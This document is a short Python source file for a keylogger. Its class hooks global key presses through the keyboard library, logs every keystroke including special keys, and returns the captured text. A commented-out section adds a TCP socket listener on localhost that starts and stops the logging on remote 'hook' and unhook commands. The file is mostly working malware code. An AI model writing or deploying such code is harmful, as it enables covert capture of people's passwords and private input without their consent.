import keyboard
import socket

class Keylogger:
    def __init__(self):
        self.keystroke_logged = []
        self.hooking = False
        
    def callback(self, event):
        key = keyboard.normalize_name(event.name)
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '\n'
        elif len(key) != 1:
            key = '[' + key + ']'
        self.keystroke_logged.append(key)

    def hook(self):
        if self.hooking == False:
            self.hooking = True
            keyboard.on_press(callback=self.callback)

    def unhook(self):
        if self.hooking == True:
            self.hooking = False
            keyboard.unhook_all()
            r = ''
            for key in self.keystroke_logged:
                r += key
            self.keystroke_logged.clear()
            return r


# k = Keylogger()

# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.bind(('127.0.0.1', 12345))
# s.listen()
# conn, adrr = s.accept()
# while True:
#     command = conn.recv(1024).decode('utf-8')
#     print('Received command:', command)
#     if command == '':
#         break
    
#     if command == 'hook':
#         k.hook()
#         print('Hook started')
#     else:
#         r = k.unhook()
#         print('Hook ended')
#         print(r)
    